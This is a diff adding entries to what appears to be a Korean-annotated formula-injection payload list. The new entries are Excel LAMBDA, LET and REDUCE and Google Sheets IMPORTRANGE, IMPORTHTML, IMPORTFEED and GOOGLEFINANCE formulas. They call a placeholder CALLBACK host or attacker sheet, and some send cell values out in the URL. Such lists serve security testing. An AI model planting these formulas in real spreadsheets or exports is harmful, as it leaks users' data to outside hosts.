@@ -28,6 +28,17 @@
 #### Power Query (Excel 2016+ M language)
 - `=Web.Contents("https://CALLBACK/m")` (Power Query)
 
+#### Excel 365 LAMBDA/LET 체인
+- `=LAMBDA(x,WEBSERVICE("https://CALLBACK/lambda?x="&x))(A1)` (LAMBDA 익명함수)
+- `=LET(u,"https://CALLBACK/let",WEBSERVICE(u))` (변수 바인딩)
+- `=REDUCE(0,A1:A10,LAMBDA(a,b,a+WEBSERVICE("https://CALLBACK/r?b="&b)))` (배열 reduce)
+
+#### Google Sheets 체인 (IMPORTRANGE/QUERY)
+- `=QUERY(IMPORTRANGE("https://docs.google.com/spreadsheets/d/<attacker-sheet>","Sheet1!A1:Z"),"SELECT *")` (외부 시트 데이터 페치)
+- `=IMPORTHTML("https://CALLBACK/h","table",1)` (HTML 테이블 파싱)
+- `=IMPORTFEED("https://CALLBACK/feed.xml")` (RSS/Atom)
+- `=GOOGLEFINANCE("CURRENCY:"&WEBSERVICE("https://CALLBACK/g"))` (간접 fetch)
+
 #### Cell reference enumeration
 - `=A1` (셀 참조 — 이메일/필터로 다른 사용자 데이터 fetch 가능)
 - `=Sheet2!A1`
